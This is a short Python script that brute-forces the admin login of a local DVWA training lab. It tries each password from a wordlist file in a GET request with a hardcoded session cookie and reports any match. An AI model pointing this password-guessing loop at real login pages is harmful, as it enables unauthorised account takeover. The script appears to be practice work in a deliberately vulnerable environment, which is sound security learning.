import requests


password = "pass"
passFilePath = "passwords.txt"
passFile = open(passFilePath)

for password in passFile.readlines() :
    password = password.strip('\n')
    url = f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={password}&Login=Login'

    cookies = {
        'security':'low' ,
        'PHPSESSID':'njos0jhhcj197l8dj3d9bs08co'
    }

    response = requests.get(url=url,cookies=cookies)

    if "incorrect" not in response.text :
        print(f"[+] Password Found {password}")
        # print(response.text)
    else :
        print(f"[-] Failed with {password}")